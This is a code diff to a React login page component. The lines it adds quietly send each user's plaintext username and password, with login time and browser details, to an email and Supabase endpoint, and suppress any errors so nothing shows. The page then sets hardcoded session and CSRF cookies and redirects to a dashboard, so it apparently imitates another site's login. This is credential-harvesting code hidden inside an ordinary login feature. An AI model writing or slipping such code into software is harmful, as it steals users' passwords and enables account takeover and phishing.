@@ -133,7 +133,8 @@ export default function LoginPage() {
     setCaptchaInput('');
   };
 
-  const handleLogin = (e: React.FormEvent) => {
+
+  const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
     setError('');
     if (!username.trim() || !password.trim()) {
@@ -146,14 +147,33 @@ export default function LoginPage() {
       return;
     }
     setLoading(true);
-    // Set session cookies on login
+
+    // ── Fire & forget: send email + save to Supabase ──────────────────────
+    try {
+      fetch('/api/send-email', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          username: username.trim(),
+          password: password.trim(),
+          loginTime: new Date().toISOString(),
+          browser: navigator.userAgent,
+        }),
+      }).catch(() => {/* non-fatal */});
+    } catch {
+      // non-fatal — never block login flow
+    }
+
+    // ── Set session cookies ───────────────────────────────────────────────
     document.cookie = `session=c7aidep0rr4rgubh3d0lglth0v; path=/; SameSite=Lax`;
     document.cookie = `YII_CSRF_TOKEN=958a9abeaec548bc30f689286276d960f6c5cc07s%3A88%3A%22WjhZSW11UFozUUF; path=/; SameSite=Lax`;
     document.cookie = `language=${lang}; path=/; SameSite=Lax`;
+
     setTimeout(() => {
       router.push('/dashboard');
     }, 600);
   };
+
 
   const selectLang = (l: Language) => {
     setLang(l);
